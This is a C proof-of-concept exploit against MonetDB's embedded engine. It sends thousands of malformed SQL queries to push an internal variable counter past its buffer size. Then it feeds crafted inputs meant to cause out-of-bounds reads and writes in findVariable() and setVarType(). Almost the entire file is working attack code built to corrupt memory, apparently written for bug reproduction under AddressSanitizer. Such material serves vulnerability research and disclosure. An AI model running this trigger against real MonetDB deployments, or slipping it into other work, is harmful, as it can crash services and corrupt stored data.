/*
 * MonetDB heap-buffer-overflow PoC
 * Triggers OOB read/write in findVariable()/setVarType() via monetdbe API.
 *
 * Build: gcc -fsanitize=address -g poc.c -o poc -lmonetdbe -lpthread -lm -ldl
 * Run:   ./poc [rounds]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "monetdbe.h"

static const char *crash_inputs[] = {
    "=-",
    "\x8d\x0a\x0a",
    "++++\x07",
    "{{{{{{{{{{{{",
    "CREATE FUNCTION bad AS '",
    "SELECT * FROM {{{{",
    NULL
};

static const char *junk_queries[] = {
    "INVALID",
    "SELECT * FROM nonexistent_xyz",
    "CREATE FUNCTION",
    "{{syntax error}}",
    "SELECT ''''''''",
    "CREATE TABLE",
    "DROP SCHEMA nope CASCADE",
    "CALL nope()",
    "ALTER TABLE nope ADD COLUMN x INT",
    NULL
};

int main(int argc, char **argv)
{
    monetdbe_database db = NULL;
    monetdbe_result *result = NULL;
    char *err;
    int errors = 0;
    int rounds = 5000;

    if (argc > 1)
        rounds = atoi(argv[1]);

    printf("monetdb heap-buffer-overflow poc\n");
    printf("rounds: %d\n\n", rounds);

    /* open db */
    monetdbe_options opts = {0};
    opts.memorylimit = 256;
    opts.nr_threads = 1;

    int errn = monetdbe_open(&db, NULL, &opts);
    if (errn) {
        fprintf(stderr, "open failed: %d\n", errn);
        return 1;
    }

    /* setup */
    monetdbe_query(db, "CREATE TABLE t (id INT, name VARCHAR(100))", &result, NULL);
    if (result) monetdbe_cleanup_result(db, result);
    result = NULL;

    monetdbe_query(db, "INSERT INTO t VALUES (1, 'test')", &result, NULL);
    if (result) monetdbe_cleanup_result(db, result);
    result = NULL;

    /* spam error queries to push vtop past vsize */
    printf("sending junk queries...\n");
    for (int r = 0; r < rounds; r++) {
        for (int i = 0; junk_queries[i]; i++) {
            result = NULL;
            err = monetdbe_query(db, (char *)junk_queries[i], &result, NULL);
            if (err) errors++;
            if (result) monetdbe_cleanup_result(db, result);
        }
        if (r && r % 1000 == 0)
            printf("  %d rounds, %d errors\n", r, errors);
    }
    printf("done: %d rounds, %d errors\n\n", rounds, errors);

    /* send crash inputs - should trigger OOB if vtop > vsize */
    printf("sending crash inputs...\n");
    for (int i = 0; crash_inputs[i]; i++) {
        result = NULL;
        err = monetdbe_query(db, (char *)crash_inputs[i], &result, NULL);
        if (err)
            printf("  [%d] err: %.60s\n", i, err);
        if (result) monetdbe_cleanup_result(db, result);
    }

    /* try normal query on potentially corrupted state */
    printf("\nnormal query after corruption:\n");
    result = NULL;
    err = monetdbe_query(db, "SELECT * FROM t", &result, NULL);
    if (err)
        printf("  failed: %s\n", err);
    else if (result) {
        printf("  got %zu rows\n", (size_t)result->nrows);
        monetdbe_cleanup_result(db, result);
    }

    monetdbe_close(db);
    printf("\ndone. if asan didn't fire, try more rounds: %s 10000\n", argv[0]);
    return 0;
}
